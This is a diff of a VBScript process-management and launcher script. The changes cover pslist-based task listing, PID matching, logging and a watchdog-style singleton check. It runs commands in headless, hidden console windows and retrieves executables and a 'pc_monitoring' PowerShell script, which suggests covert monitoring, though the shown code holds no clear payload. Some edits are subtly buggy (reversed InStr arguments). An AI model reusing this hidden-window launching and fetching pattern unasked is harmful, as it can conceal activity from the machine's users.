@@ -135,7 +135,9 @@ Function GetMD5Hash(fpath, outfpath)
 End Function
 
 Function GetProcessName(pid)
-    Call LogMsg("GetProcessName: " & CStr(pid))
+    Dim pp : pp = "GetProcessName"
+    
+    Call LogMsg(pp & " -- starting pid=" & CStr(pid))
     
     GetProcessName = ""
 
@@ -146,14 +148,22 @@ Function GetProcessName(pid)
     For i = 0 to list.Count
         Dim proc : proc = list.Item(i)
         
-        if ( proc(1) = pid ) then
-            GetProcessName = proc(0)
-            Call LogMsg("GetProcessName: procname=" & GetProcessName)
+        If IsValidArray(proc) >= 2 Then
+            if ( CStr(proc(1)) = CStr(pid) ) then
+                
+                GetProcessName = proc(0)
+                Call LogMsg(pp & ": procname=" & GetProcessName)
 
-            Exit Function
-        End If
+                Exit Function
+            End If
+        End IF
         
     Next
+        
+    If Err.Number <> 0 then
+        Call LogMsg(pp & " -- reporting errors")
+        Call LogErr()
+    End IF
     
 End Function
 
@@ -204,8 +214,14 @@ Function GetTaskList()
     
     Dim dictobj : set dictobj = CreateObject("Scripting.Dictionary") 
     Set GetTaskList = dictobj
-
-    Call RunShell("conhost.exe --headless cmd /c tasklist /nh /v /fo:csv > " & fpath, true)
+   
+    Dim ispslist : ispslist = false
+    If fso.FileExists(workdir & "\pslist.exe") then
+        Call RunShell("conhost.exe --headless cmd /c " & workdir & "\pslist.exe" & " -accepteula > " & fpath, true)
+        ispslist = true
+    Else
+        Call RunShell("conhost.exe --headless cmd /c tasklist /nh /v /fo:csv > " & fpath, true)
+    End IF
     
     If not fso.FileExists(fpath) then
         Call LogMsg(pp & " tasklist did not create output file as expected -- exiting function")
@@ -223,11 +239,31 @@ Function GetTaskList()
         Call LogMsg(pp & " linecount=" & CStr(linecount))
     End If
 
+    Dim regEx : Set regEx = CreateObject("VBScript.RegExp")
+    With regEx
+        .Global = True
+        .IgnoreCase = True
+        .Pattern = "\s+" 
+    End With
+
     Dim i : i = 0
+    Dim linei : linei = 0
     Dim line
     For Each line In lines
-        i = i + 1
-        Dim tokens : tokens = Split(line, ",")
+        Dim tokens 
+        linei = linei + 1
+        
+        if ( ispslist ) and ( linei >= 9 ) then
+            
+            line = Trim(regEx.Replace(line, " "))
+        
+            tokens = Split(line, " ")
+        else
+            tokens = Split(line, ",")
+        end IF
+        
+        
+        
         Dim procname : procname = ""
         Dim pid : pid = ""
 
@@ -237,10 +273,13 @@ Function GetTaskList()
             
             procname = Replace(procname, Chr(34), "")
             pid = Replace(pid, Chr(34), "")
-
-            Dim myArray : myArray = Array(procname, pid)
+            
+            ' Call LogMsg(pp & " -- procname=" & procname & " pid=" & pid)
+            
+            Dim myArray : myArray = Array(CStr(procname), CStr(pid))
 
             dictobj.Add i, myArray
+            i = i + 1
         End If
 
     Next
@@ -280,11 +319,13 @@ Function GetProcessList()
     Dim item
     For Each item In colItems
     
+    
         Dim myArray : myArray = Array(item.Name, item.ProcessId)
 
         list.Add i, myArray
 
         i = i + 1
+    
     Next
 
     Set GetProcessList = list
@@ -1742,7 +1783,6 @@ Function Watchdog()
     
 End Function
 
-' TODO: add assets to list
 Function Retrieve()
     Dim pp : pp = "Retrieve"
     
@@ -1753,7 +1793,7 @@ Function Retrieve()
     Dim files 
     
     ' pcmon, relay, modify_edge_lnk.ps1, gunite, 7za, nircmdc
-    files = Array("launch.exe", "pc_monitoring.ps1", "tpl_launch.exe")
+    files = Array("pslist.exe", "launch.exe", "pc_monitoring.ps1", "tpl_launch.exe")
         
     Dim file
     For Each file in files
@@ -1863,13 +1903,14 @@ End Function
 
 Function ForceSingleton()
     Dim pp : pp = "ForceSingleton"
-    Call LogMsg("ForceSingleton: starting")
+
+    Call LogMsg(pp & ": starting")
     
     Dim scriptpid : scriptpid = GetScriptPID()
     
     Dim scriptprocname : scriptprocname = GetProcessName(scriptpid)
     
-    Call LogMsg("ForceSingleton: scriptpid=" & scriptpid)
+    Call LogMsg(pp & ": scriptpid=" & scriptpid)
      
     Dim tagname : tagname = cmdname & "_running"
     Dim tagfpath : tagfpath = workdir & "\" & tagname
@@ -1881,7 +1922,7 @@ Function ForceSingleton()
         Call WriteFile(tagfpath, scriptpid)
         
     Else
-        Call LogMsg("ForceSingleton: running file exists")
+        Call LogMsg(pp & ": running file exists")
 
         Dim procname : procname = ""
         Dim pid : pid = IsCmdRunning(cmdname, workdir, procname)
@@ -1897,7 +1938,7 @@ Function ForceSingleton()
             Call LogMsg(pp & " -- found cmd running with pid=" & CStr(pid) & " procname=" & procname)
         End If
         
-        If pid > 0 and scriptpid <> pid and LCase(procname) = "cscript.exe" Then
+        If pid > 0 and CStr(scriptpid) <> CStr(pid) and InStr("cscript.exe", LCase(procname))>=1 Then
             Call LogMsg(pp & ": duplicate found -- exiting")
             WScript.Quit(1)
         End If
@@ -1949,7 +1990,7 @@ Function ActivateExe(texedir, texefname, texename, argarr)
 
     Call LogMsg(pp & ": procname=" & procname & " cmdpid=" & CStr(cmdpid))
     
-    If ( cmdpid > 0 ) Then ' and ( LCase(procname) = "python.exe" )
+    If ( CLng(cstr(cmdpid)) > 0 ) Then ' and ( LCase(procname) = "python.exe" )
                      
         ActivateExe = cmdpid
         
@@ -2945,8 +2986,9 @@ Function ReadCmdPid(tcmdname, tworkdir)
 End Function
 
 Function IsCmdRunning(tcmdname, tworkdir, ByRef tprocname)
+    Dim pp : pp = "IsCmdRunning"
     
-    Call LogMsg("IsCmdRunning -- " & tcmdname & " " & tworkdir)
+    Call LogMsg(pp & " -- starting cmdname=" & tcmdname & " workdir=" & tworkdir)
     tprocname = ""
     
     IsCmdRunning = -1
@@ -2959,21 +3001,21 @@ Function IsCmdRunning(tcmdname, tworkdir, ByRef tprocname)
     Set list = GetProcessList()
     
     If list Is Nothing Then
-        Call LogMsg("IsCmdRunning process list is empty -- exiting function")
+        Call LogMsg(pp & " process list is empty -- exiting function")
         Exit Function
     End IF
     
     If list.Count = 0 Then
-        Call LogMsg("IsCmdRunning process list is empty -- exiting function")
+        Call LogMsg(pp & " process list is empty -- exiting function")
         Exit Function
     End IF
     
     Dim cmdpid : cmdpid = ReadCmdPid(tcmdname, tworkdir)
     
-    Call LogMsg("IsCmdRunning read pid=" & CStr(cmdpid))
+    Call LogMsg(pp & " read pid=" & CStr(cmdpid))
 
     If Not cmdpid > 0 Then
-        Call LogMsg("IsCmdRunning cmdpid negative -- exiting function")
+        Call LogMsg(pp & " cmdpid negative -- exiting function")
         Exit Function
     End If
     
@@ -2985,18 +3027,27 @@ Function IsCmdRunning(tcmdname, tworkdir, ByRef tprocname)
         Dim procname : procname = item(0)       
         Dim pid : pid = item(1)
         
-        If ( pid = cmdpid ) Then
-            IsCmdRunning = pid
+        ' Call LogMsg(pp & " procname="& procname & " pid=" & pid & " cmdpid=" & cmdpid)
+
+        If ( CStr(pid) = CStr(cmdpid) ) Then
+            IsCmdRunning = CLng(cstr(pid))
             tprocname = procname
-            Call LogMsg("IsCmdRunning found matching pid=" & CStr(pid) & " procname=" & procname)
-            Call LogMsg("IsCmdRunning -- exiting function")
+            Call LogMsg(pp & " found matching pid=" & CStr(pid) & " procname=" & procname & " -- exiting function")
             Exit Function
         End IF
 
     Next
 
-    Call LogMsg("IsCmdRunning failed to find match")
+    Call LogMsg(pp & " failed to find match")
     
+    If Err.Number <> 0 then
+        Call LogMsg(pp & " -- reporting errors")
+        Call LogErr()
+        Exit Function
+    End IF
+    
+    Call LogMsg(pp & " -- finished")
+
 End Function
 
 Function ExecExe(exename, exefname, exedir, args)
@@ -3193,13 +3244,11 @@ Function ActivateCmd(tcmdname)
     Dim procname : procname = ""
     Dim cmdpid : cmdpid = IsCmdRunning(tcmdname, workdir, procname)
 
-    Call LogMsg(pp & " -- IsCmdRunning: procname=" & procname & " cmdpid=" & CStr(cmdpid))
-    
-    If ( cmdpid > 0 and ( LCase(procname) = "cscript.exe" ) ) Then
+    If ( CLng(Cstr(cmdpid)) > 0 and ( InStr("cscript.exe",LCase(procname)) >= 1 ) ) Then
                      
         ActivateCmd = cmdpid
         
-        Call LogMsg(pp & ": cmd is running -- no need to launch")
+        Call LogMsg(pp & ": cmd is running -- no need to launch -- exiting function")
         Exit Function
     End If
     
